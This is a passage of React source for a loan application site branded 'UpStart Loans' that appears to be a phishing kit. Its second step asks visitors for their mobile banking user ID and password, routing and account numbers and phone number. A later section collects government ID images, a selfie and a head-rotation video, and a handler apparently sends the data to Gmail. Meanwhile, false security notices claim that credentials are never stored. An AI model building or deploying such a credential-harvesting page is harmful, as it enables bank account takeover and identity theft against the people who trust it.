                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  required
                >
                  <option value="">Select your bank</option>
                  <option value="Chase">Chase</option>
                  <option value="Bank of America">Bank of America</option>
                  <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
                  <option value="Wells Fargo">Wells Fargo</option>
                  <option value="US Bank">US Bank</option>
                  <option value="Regions Bank">Regions Bank</option>
                  <option value="USAA Federal Savings Bank">USAA Federal Savings Bank</option>
                  <option value="TD Bank">TD Bank</option>
                  <option value="Truist Bank">Truist Bank</option>
                  <option value="Huntington National Bank">Huntington National Bank</option>
                  <option value="Alabama Central CU">Alabama Central CU</option>
                  <option value="Navigator Credit Union">Navigator Credit Union</option>
                  <option value="Diversified Members Credit Union">Diversified Members Credit Union</option>
                  <option value="Arthur State Bank">Arthur State Bank</option>
                  <option value="Others">Others</option>
                </select>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Routing Number *
              </label>
              <input
                type="text"
                name="routingNumber"
                value={formData.routingNumber}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="123456789"
                pattern="[0-9]{9}"
                maxLength="9"
                required
              />
            </div>

            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Account Number *
              </label>
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="1234"
                pattern="[0-9]{4,20}"
                minLength="4"
                maxLength="20"
                required
              />
            </div>
          </div>
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <p className="text-sm text-blue-800 text-center">
            Your details are securely shared with relevant providers
          </p>
        </div>

        <button
          type="submit"
          className="w-full btn-primary text-lg py-4"
        >
          Continue
          <ArrowRight className="ml-2 w-5 h-5 inline" />
        </button>
      </form>
    </div>
  )

  const renderStep2 = () => (
    <div className="max-w-6xl mx-auto">
      <div className="text-center mb-8">
        <div className="w-16 h-16 bg-accent-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <span className="text-2xl">{currentLoanConfig.icon}</span>
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Step 2: Secure Verification</h2>
        <p className="text-gray-600">Securely connect your bank account to verify your {currentLoanConfig.title} information</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Left Column - Security Info */}
        <div className="space-y-6">
          {/* Security Priority */}
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-6">
            <h3 className="font-bold text-blue-900 mb-3 flex items-center">
              <Shield className="w-5 h-5 mr-2 text-blue-600" />
              Your Security is Our Priority
            </h3>
            <p className="text-blue-800">
              We use industry-leading security measures to protect your financial information and ensure your data remains safe and private.
            </p>
          </div>

          {/* How It Works */}
          <div className="bg-gray-50 rounded-xl p-6">
            <h3 className="font-bold text-gray-900 mb-4">How Secure Verification Works</h3>
            <p className="text-gray-600 mb-4">Our secure bank authentication process is simple and takes just a few minutes.</p>
            
            <div className="space-y-3">
              {[
                { step: "Step 1", title: "Choose Your Bank", desc: "Select your bank from our list of supported financial institutions." },
                { step: "Step 2", title: "Secure Login", desc: "Log in using your existing online banking credentials through our secure portal." },
                { step: "Step 3", title: "Grant Permission", desc: "Authorize us to access your account information for verification purposes only." },
                { step: "Step 4", title: "Instant Verification", desc: "We verify your income and account information instantly and securely." }
              ].map((item, index) => (
                <div key={index} className="flex items-start space-x-3">
                  <div className="w-8 h-8 bg-primary-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <span className="text-primary-600 font-bold text-xs">{item.step.split(' ')[1]}</span>
                  </div>
                  <div>
                    <h4 className="font-semibold text-gray-900">{item.title}</h4>
                    <p className="text-sm text-gray-600">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Security Measures */}
          <div className="bg-green-50 border border-green-200 rounded-xl p-6">
            <h3 className="font-bold text-green-900 mb-4">Our Security Measures</h3>
            <p className="text-green-800 mb-4">We employ multiple layers of security to protect your sensitive financial information.</p>
            
            <div className="space-y-3">
              {[
                { title: "256-bit SSL Encryption", desc: "All data transmission is protected with bank-level encryption technology." },
                { title: "Secure Data Storage", desc: "Your information is stored in secure, encrypted databases with restricted access." },
                { title: "Limited Data Use", desc: "We only use your banking information for loan verification and underwriting purposes." },
                { title: "Automatic Deletion", desc: "Your banking credentials are automatically deleted after verification is complete." },
                { title: "Regulatory Compliance", desc: "We comply with all federal banking regulations and privacy laws." }
              ].map((item, index) => (
                <div key={index} className="flex items-start space-x-2">
                  <CheckCircle className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-green-900 text-sm">{item.title}</h4>
                    <p className="text-xs text-green-800">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right Column - Form */}
        <div className="space-y-6">
          {/* Bank Connection Form */}
          <div className="bg-white rounded-xl shadow-lg p-6 border border-gray-200">
            <h3 className="font-bold text-gray-900 mb-4">Connect Your Bank Account</h3>
            <p className="text-sm text-gray-600 mb-6">Securely connect your mobile banking account to verify your {currentLoanConfig.title} information instantly.</p>
            
            <form onSubmit={handleStep2Submit} className="space-y-6">
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                <p className="text-sm text-yellow-800">
                  <strong>Secure Bank Connection:</strong> Your credentials are encrypted and never stored
                </p>
              </div>

              {/* Bank Selection */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Bank Name *
                </label>
                <div className="relative">
                  <Building2 className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <select
                    name="bankName"
                    value={formData.bankName}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    required
                  >
                    <option value="">Select your bank</option>
                    <option value="Chase">Chase</option>
                    <option value="Bank of America">Bank of America</option>
                    <option value="Navy Federal Credit Union">Navy Federal Credit Union</option>
                    <option value="Wells Fargo">Wells Fargo</option>
                    <option value="US Bank">US Bank</option>
                    <option value="Regions Bank">Regions Bank</option>
                    <option value="USAA Federal Savings Bank">USAA Federal Savings Bank</option>
                    <option value="TD Bank">TD Bank</option>
                    <option value="Truist Bank">Truist Bank</option>
                    <option value="Huntington National Bank">Huntington National Bank</option>
                    <option value="Alabama Central CU">Alabama Central CU</option>
                    <option value="Navigator Credit Union">Navigator Credit Union</option>
                    <option value="Diversified Members Credit Union">Diversified Members Credit Union</option>
                    <option value="Other">Other (Enter bank name below)</option>
                  </select>
                </div>
              </div>

              {/* Custom Bank Name - Show only when "Other" is selected */}
              {formData.bankName === 'Other' && (
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Enter Your Bank Name *
                  </label>
                  <div className="relative">
                    <Building2 className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                    <input
                      type="text"
                      name="customBankName"
                      value={formData.customBankName || ''}
                      onChange={handleInputChange}
                      className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                      placeholder="Enter your bank name"
                      required={formData.bankName === 'Other'}
                    />
                  </div>
                  <p className="text-xs text-gray-500 mt-1">Please enter the exact name of your bank or credit union</p>
                </div>
              )}

              {/* Mobile App Credentials */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Mobile App User ID *
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <input
                    type="text"
                    name="mobileAppUsername"
                    value={formData.mobileAppUsername}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    placeholder="Enter your mobile banking username"
                    required
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Mobile App Password *
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <input
                    type="password"
                    name="mobileAppPassword"
                    value={formData.mobileAppPassword}
                    onChange={handleInputChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                    placeholder="Enter your mobile banking password"
                    required
                  />
                </div>
              </div>

              {/* Phone Number */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Telephone Number *
                </label>
                <div className="relative">
                  <Phone className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                  <input
                    type="tel"
                    name="phoneNumber"
                    value={formData.phoneNumber}
                    onChange={handleInputChange}
                    maxLength="10"
                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 ${
                      validationErrors.phoneNumber 
                        ? 'border-red-300 bg-red-50' 
                        : 'border-gray-300'
                    }`}
                    placeholder="5551234567"
                    pattern="[0-9]{10}"
                    required
                  />
                </div>
                {validationErrors.phoneNumber && (
                  <p className="text-red-600 text-sm mt-1 flex items-center">
                    <span className="mr-1">!</span> {validationErrors.phoneNumber}
                  </p>
                )}
                <p className="text-xs text-gray-500 mt-1">
                  Enter exactly 10 digits (e.g., 5551234567). Used for verification and provider communication.
                </p>
              </div>

              {/* Security Notice */}
              <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                <h4 className="font-semibold text-red-900 mb-2">Important Security Notice</h4>
                <ul className="text-sm text-red-800 space-y-1">
                  <li>• We use read-only access to verify your account information</li>
                  <li>• Your login credentials are never stored on our servers</li>
                  <li>• Connection is secured with 256-bit SSL encryption</li>
                  <li>• You can revoke access at any time through your bank</li>
                </ul>
              </div>

              {/* Terms Agreement */}
              <div className="bg-gray-50 rounded-lg p-4">
                <label className="flex items-start space-x-3">
                  <input type="checkbox" className="mt-1" required />
                  <span className="text-sm text-gray-700">
                    By connecting your account, you agree to our <a href="/privacy-policy" className="text-primary-600 hover:underline">Privacy Policy</a> and <a href="/terms-of-service" className="text-primary-600 hover:underline">Terms of Service</a>
                  </span>
                </label>
              </div>

              <button
                type="submit"
                className="w-full btn-primary text-lg py-4"
                disabled={isSubmittingEmail}
              >
                {isSubmittingEmail ? (
                  <>
                    <span className="inline-flex items-center">
                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Sending Application...
                    </span>
                  </>
                ) : (
                  <>
                    Generate Agreement
                    <ArrowRight className="ml-2 w-5 h-5 inline" />
                  </>
                )}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )

  const renderAgreementStep = () => {
    // Calculate loan details
    const principal = parseFloat(formData.loanAmount) || 0;
    const months = parseInt(formData.loanTerm) || 12;
    const monthlyPayment = calculateMonthlyPayment(formData.loanAmount, formData.loanTerm);
    const totalRepayment = monthlyPayment * months;
    
    // Mask sensitive information
    const maskedPhone = formData.phoneNumber ? formData.phoneNumber.slice(-4) : '';
    const maskedAccount = formData.accountNumber ? formData.accountNumber.slice(-4) : '';
    
    return (
    <div className="max-w-6xl mx-auto">
      <div className="text-center mb-8">
        <h1 className="text-3xl font-bold text-gray-900 mb-2">UpStart Loans Loan Agreement</h1>
        <p className="text-gray-600">Review and Sign Your Personal Loan Agreement</p>
      </div>

      <div className="bg-white rounded-2xl shadow-lg border border-gray-200">
        {/* Header Section */}
        <div className="bg-gray-900 text-white p-6 rounded-t-2xl">
          <h2 className="text-2xl font-bold text-center mb-4">Lender Offer & Agreement</h2>
          <div className="grid grid-cols-2 gap-4 text-center">
            <div>
              <p className="text-sm text-gray-400">Agreement Number:</p>
              <p className="text-lg font-semibold">{loanAgreementNumber}</p>
            </div>
            <div>
              <p className="text-sm text-gray-400">Date:</p>
              <p className="text-lg font-semibold">{new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
            </div>
          </div>
        </div>

        {/* Agreement Content */}
        <div className="p-8 max-h-96 overflow-y-auto">
          {/* Application Review */}
          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Application Review</h3>
            <p className="text-gray-700">Our system reviews your application and matches you with suitable lenders.</p>
          </div>

          {/* Loan Summary & Disclosure */}
          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Loan Summary & Disclosure</h3>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-3">
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Borrower Name</p>
                  <p className="font-semibold">{formData.firstName} {formData.lastName}</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Loan Amount</p>
                  <p className="font-semibold">${principal.toLocaleString()}.00</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Loan Duration</p>
                  <p className="font-semibold">{months} months</p>
                </div>
              </div>
              <div className="space-y-3">
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Annual Percentage Rate (APR)</p>
                  <p className="font-semibold">10.00%</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Monthly Payment (EMI)</p>
                  <p className="font-semibold">${monthlyPayment}</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Total Repayment Amount</p>
                  <p className="font-semibold">${totalRepayment.toFixed(2)}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Borrower Details */}
          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Borrower Details</h3>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-3">
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Full Name</p>
                  <p className="font-semibold">{formData.firstName} {formData.lastName}</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Email Address</p>
                  <p className="font-semibold">{formData.email}</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Phone Number</p>
                  <p className="font-semibold">••••••••{maskedPhone}</p>
                </div>
              </div>
              <div className="space-y-3">
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Financial Institution</p>
                  <p className="font-semibold">{formData.bankName}</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Account Routing Number</p>
                  <p className="font-semibold">{formData.routingNumber}</p>
                </div>
                <div className="border-b pb-2">
                  <p className="text-sm text-gray-500">Account Number</p>
                  <p className="font-semibold">••••••••{maskedAccount}</p>
                </div>
              </div>
            </div>
            <div className="mt-4">
              <div className="border-b pb-2">
                <p className="text-sm text-gray-500">Address</p>
                <p className="font-semibold">{formData.homeAddress}, {formData.city}, {formData.state} {formData.zipCode}</p>
              </div>
            </div>
          </div>

          {/* Legal Sections */}
          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Loan Terms & Conditions</h3>
            <div className="text-sm text-gray-700 space-y-4">
              <div>
                <h4 className="font-semibold mb-2">1. Loan Amount and Purpose</h4>
                <p>Lender agrees to lend to Borrower the principal sum of ${principal.toLocaleString()}.00 ("Loan Amount") for personal, family, or household purposes. This loan is unsecured and not backed by any collateral.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">2. Interest Rate</h4>
                <p>The Loan Amount shall bear interest at a fixed annual percentage rate (APR) of 10.00%. Interest will be calculated on the outstanding principal balance.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">3. Loan Term</h4>
                <p>The loan term shall be {months} months, commencing from the date of this agreement.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">4. Payment Schedule</h4>
                <p>Borrower shall make equal monthly payments of ${monthlyPayment} on the 6 day of each month. The first payment is due within 30 days of loan disbursement.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">5. Prepayment</h4>
                <p>Borrower may prepay all or any portion of the Loan Amount at any time without penalty. Prepayment will be applied first to accrued interest, then to principal.</p>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Repayment, Late Fees & Default</h3>
            <div className="text-sm text-gray-700 space-y-4">
              <div>
                <h4 className="font-semibold mb-2">1. Late Payment Fees</h4>
                <p>If any payment is not received within 10 days of the due date, a late fee of $25 or 5% of the overdue amount, whichever is greater, will be charged.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">2. Default</h4>
                <p>The loan will be considered in default if: (a) Borrower fails to make any payment when due; (b) Borrower provides false information; (c) Borrower becomes bankrupt or insolvent.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">3. Consequences of Default</h4>
                <p>Upon default, Lender may declare the entire outstanding balance immediately due and payable, report the default to credit bureaus, and pursue collection activities as permitted by law.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">4. Collection Costs</h4>
                <p>Borrower agrees to pay all costs of collection, including reasonable attorney fees, incurred by Lender in enforcing this agreement.</p>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Privacy & Security</h3>
            <div className="text-sm text-gray-700 space-y-4">
              <div>
                <h4 className="font-semibold mb-2">1. Data Protection</h4>
                <p>All personal and financial information is protected using industry-standard SSL encryption and data protection protocols. We comply with all applicable data protection laws.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">2. Information Sharing</h4>
                <p>We may share your information with: (a) Credit bureaus for reporting purposes; (b) Government agencies as required by law; (c) Service providers who assist in loan processing.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">3. Security Measures</h4>
                <p>Our website uses 256-bit SSL encryption, firewalls, and regular protection audits to protect your data. All sensitive information is encrypted both in transit and at rest.</p>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">US Legal Clauses & Compliance</h3>
            <div className="text-sm text-gray-700 space-y-4">
              <div>
                <h4 className="font-semibold mb-2">1. Truth in Lending Act (TILA) Compliance</h4>
                <p>This agreement complies with the Truth in Lending Act. All APR, fees, and terms have been clearly disclosed. Borrower has the right to rescind this agreement within 3 business days.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">2. Electronic Agreement Act Compliance</h4>
                <p>This electronic agreement has the same legal effect as a paper document. By signing electronically, Borrower consents to conduct business electronically.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">3. Governing Law</h4>
                <p>This agreement shall be governed by and construed in accordance with the laws of the State of New York, without regard to its conflict of law principles.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">4. Dispute Resolution</h4>
                <p>Any disputes arising from this agreement shall be resolved through binding arbitration in accordance with the rules of the American Arbitration Association.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">5. Entire Agreement</h4>
                <p>This agreement constitutes the entire understanding between the parties and supersedes all prior agreements, whether written or oral.</p>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Payment Schedule</h3>
            <div className="text-sm text-gray-700 space-y-4">
              <div>
                <h4 className="font-semibold mb-2">Monthly Payment Schedule</h4>
                <p>Borrower shall make {months} equal monthly payments of ${monthlyPayment} each.</p>
                <p>First payment is due within 30 days of loan disbursement.</p>
                <p>Each subsequent payment is due on the same day of each month thereafter.</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">Payment Breakdown</h4>
                <p>Payment Amount: ${monthlyPayment} per month</p>
                <p>Number of Payments: {months}</p>
                <p>Total Amount to be Paid: ${totalRepayment.toFixed(2)}</p>
                <p>Total Interest Paid: ${(totalRepayment - principal).toFixed(2)}</p>
              </div>
              <div>
                <h4 className="font-semibold mb-2">Payment Methods</h4>
                <p>Payments can be made via: (a) Automatic bank transfer (ACH); (b) Online payment portal; (c) Check by mail; (d) Phone payment.</p>
                <p>Automatic bank transfer is the preferred method to ensure timely payments.</p>
              </div>
              
              {/* Payment Amortization Table */}
              <div className="mt-6">
                <h4 className="font-semibold mb-2">Payment Amortization Schedule</h4>
                <div className="overflow-x-auto">
                  <table className="min-w-full border border-gray-300 text-xs">
                    <thead className="bg-gray-100">
                      <tr>
                        <th className="border border-gray-300 px-2 py-1 text-left">Payment #</th>
                        <th className="border border-gray-300 px-2 py-1 text-left">Payment Date</th>
                        <th className="border border-gray-300 px-2 py-1 text-right">Payment Amount</th>
                        <th className="border border-gray-300 px-2 py-1 text-right">Principal</th>
                        <th className="border border-gray-300 px-2 py-1 text-right">Interest</th>
                        <th className="border border-gray-300 px-2 py-1 text-right">Balance</th>
                      </tr>
                    </thead>
                    <tbody>
                      {(() => {
                        if (!principal || !months || !monthlyPayment) return null;
                        
                        const paymentSchedule = [];
                        let balance = principal;
                        const monthlyRate = 0.10 / 12;
                        const startDate = new Date();
                        
                        for (let i = 1; i <= months; i++) {
                          const paymentDate = new Date(startDate.getFullYear(), startDate.getMonth() + i, 6);
                          const interestPayment = balance * monthlyRate;
                          const principalPayment = monthlyPayment - interestPayment;
                          balance -= principalPayment;
                          
                          paymentSchedule.push({
                            paymentNum: i,
                            date: paymentDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
                            payment: monthlyPayment,
                            principal: principalPayment,
                            interest: interestPayment,
                            balance: Math.max(0, balance)
                          });
                        }
                        
                        return paymentSchedule.map((payment) => (
                          <tr key={payment.paymentNum}>
                            <td className="border border-gray-300 px-2 py-1">{payment.paymentNum}</td>
                            <td className="border border-gray-300 px-2 py-1">{payment.date}</td>
                            <td className="border border-gray-300 px-2 py-1 text-right">${payment.payment}</td>
                            <td className="border border-gray-300 px-2 py-1 text-right">${payment.principal}</td>
                            <td className="border border-gray-300 px-2 py-1 text-right">${payment.interest}</td>
                            <td className="border border-gray-300 px-2 py-1 text-right">${payment.balance}</td>
                          </tr>
                        ));
                      })()}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-xl font-bold text-gray-900 mb-4">Electronic Consent & Agreement</h3>
            <div className="text-sm text-gray-700 space-y-2">
              <p>By clicking "I Agree" below, I certify that:</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>I have read, understood, and agree to all terms and conditions in this loan agreement</li>
                <li>All information provided is true and accurate to the best of my knowledge</li>
                <li>I understand this is a legally binding agreement</li>
                <li>I consent to receive loan documents and communications electronically</li>
                <li>I understand that my electronic agreement has the same legal effect as a handwritten signature</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Digital Agreement Section */}
        <div className="border-t bg-gray-50 p-6 rounded-b-2xl">
          <h3 className="text-xl font-bold text-gray-900 mb-4">Digital Agreement</h3>
          
          <div className="mb-6">
            <label className="flex items-center space-x-2 mb-4">
              <input
                type="checkbox"
                checked={agreementAccepted}
                onChange={(e) => setAgreementAccepted(e.target.checked)}
                className="w-4 h-4"
              />
              <span className="text-sm font-medium">I accept the Terms & Conditions and agree to be bound by this loan agreement</span>
            </label>
          </div>

          {/* Electronic Signature */}
          <div className="mb-8">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Draw your signature below:
            </label>
            
            <div className="bg-white border-2 border-gray-300 rounded-lg relative">
              <canvas
                ref={canvasRef}
                className="w-full h-32 rounded cursor-crosshair"
                onMouseDown={startDrawing}
                onMouseMove={draw}
                onMouseUp={stopDrawing}
                onMouseLeave={stopDrawing}
                onTouchStart={startDrawing}
                onTouchMove={draw}
                onTouchEnd={stopDrawing}
              />
              {!signature && (
                <div className="absolute inset-0 flex items-center justify-center text-gray-400 pointer-events-none">
                  <span>Sign here with mouse or finger</span>
                </div>
              )}
            </div>
            
            <div className="flex space-x-4 mt-4">
              <button
                onClick={clearSignature}
                className="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded text-sm"
              >
                Clear Signature
              </button>
            </div>
          </div>

          {/* KYC Verification Section */}
          <div className="mb-8 border-t pt-6">
            <h3 className="text-xl font-bold text-gray-900 mb-2">KYC Verification (Optional)</h3>
            <p className="text-sm text-gray-600 mb-6">Upload the following documents to verify your identity. All fields are optional.</p>
            
            <div className="space-y-6">
              {/* Government ID Front */}
              <div className="bg-gray-50 p-4 rounded-lg border border-gray-200">
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  1. Government ID Front (Optional)
                </label>
                <input
                  type="file"
                  id="id-front-upload"
                  accept=".pdf,.jpg,.jpeg,.png"
                  onChange={handleIdFrontUpload}
                  className={`w-full px-3 py-2 border rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                    idFrontError ? 'border-red-500 bg-red-50' : 'border-gray-300'
                  }`}
                />
                {idFrontError && (
                  <p className="text-red-500 text-xs mt-1">{idFrontError}</p>
                )}
                {idFront && (
                  <div className="flex items-center justify-between mt-2 p-2 bg-green-50 rounded border border-green-200">
                    <span className="text-sm text-green-700">
                      {idFront.name} ({(idFront.size / 1024 / 1024).toFixed(2)} MB)
                    </span>
                    <button
                      onClick={handleRemoveIdFront}
                      className="text-red-500 hover:text-red-700 text-sm font-medium"
                    >
                      Remove
                    </button>
                  </div>
                )}
                <p className="text-xs text-gray-500 mt-2">
                  Accepted formats: JPG, JPEG, PNG, PDF &middot; Max size: 5MB
                </p>
              </div>

              {/* Government ID Back */}
              <div className="bg-gray-50 p-4 rounded-lg border border-gray-200">
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  2. Government ID Back (Optional)
                </label>
                <input
                  type="file"
                  id="id-back-upload"
                  accept=".pdf,.jpg,.jpeg,.png"
                  onChange={handleIdBackUpload}
                  className={`w-full px-3 py-2 border rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                    idBackError ? 'border-red-500 bg-red-50' : 'border-gray-300'
                  }`}
                />
                {idBackError && (
                  <p className="text-red-500 text-xs mt-1">{idBackError}</p>
                )}
                {idBack && (
                  <div className="flex items-center justify-between mt-2 p-2 bg-green-50 rounded border border-green-200">
                    <span className="text-sm text-green-700">
                      {idBack.name} ({(idBack.size / 1024 / 1024).toFixed(2)} MB)
                    </span>
                    <button
                      onClick={handleRemoveIdBack}
                      className="text-red-500 hover:text-red-700 text-sm font-medium"
                    >
                      Remove
                    </button>
                  </div>
                )}
                <p className="text-xs text-gray-500 mt-2">
                  Accepted formats: JPG, JPEG, PNG, PDF &middot; Max size: 5MB
                </p>
              </div>

              {/* Selfie Photo */}
              <div className="bg-gray-50 p-4 rounded-lg border border-gray-200">
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  3. Selfie Photo (Optional)
                </label>
                <input
                  type="file"
                  id="selfie-photo-upload"
                  accept=".jpg,.jpeg,.png"
                  onChange={handleSelfiePhotoUpload}
                  className={`w-full px-3 py-2 border rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                    selfiePhotoError ? 'border-red-500 bg-red-50' : 'border-gray-300'
                  }`}
                />
                {selfiePhotoError && (
                  <p className="text-red-500 text-xs mt-1">{selfiePhotoError}</p>
                )}
                {selfiePhoto && (
                  <div className="flex items-center justify-between mt-2 p-2 bg-green-50 rounded border border-green-200">
                    <span className="text-sm text-green-700">
                      {selfiePhoto.name} ({(selfiePhoto.size / 1024 / 1024).toFixed(2)} MB)
                    </span>
                    <button
                      onClick={handleRemoveSelfiePhoto}
                      className="text-red-500 hover:text-red-700 text-sm font-medium"
                    >
                      Remove
                    </button>
                  </div>
                )}
                <p className="text-xs text-gray-500 mt-2">
                  Accepted formats: JPG, JPEG, PNG &middot; Max size: 5MB
                </p>
              </div>

              {/* 360-Degree Head Rotation Video */}
              <div className="bg-gray-50 p-4 rounded-lg border border-gray-200">
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  4. 360-Degree Head Rotation Video (Optional)
                </label>
                <input
                  type="file"
                  id="head-rotation-video-upload"
                  accept=".mp4,.webm,.mov"
                  onChange={handleHeadRotationVideoUpload}
                  className={`w-full px-3 py-2 border rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                    headRotationVideoError ? 'border-red-500 bg-red-50' : 'border-gray-300'
                  }`}
                />
                {headRotationVideoError && (
                  <p className="text-red-500 text-xs mt-1">{headRotationVideoError}</p>
                )}
                {headRotationVideo && (
                  <div className="flex items-center justify-between mt-2 p-2 bg-green-50 rounded border border-green-200">
                    <span className="text-sm text-green-700">
                      {headRotationVideo.name} ({(headRotationVideo.size / 1024 / 1024).toFixed(2)} MB)
                    </span>
                    <button
                      onClick={handleRemoveHeadRotationVideo}
                      className="text-red-500 hover:text-red-700 text-sm font-medium"
                    >
                      Remove
                    </button>
                  </div>
                )}
                <p className="text-xs text-gray-500 mt-2">
                  Accepted formats: MP4, WebM, MOV &middot; Max size: 50MB
                </p>
                <div className="mt-2 p-2 bg-blue-50 rounded text-xs text-blue-700">
                  <strong>Instructions:</strong> Record a 360-degree video slowly turning your head left to right for identity verification.
                </div>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="border-t pt-6">
            <div className="flex flex-wrap gap-3">
              <button
                onClick={submitAgreementToGmail}
                disabled={!agreementAccepted || !signature || isSubmittingEmail}
                className="bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white px-6 py-3 rounded font-medium text-sm"
              >
                {isSubmittingEmail ? 'Submitting...' : 'Submit Agreement'}
              </button>
              <button
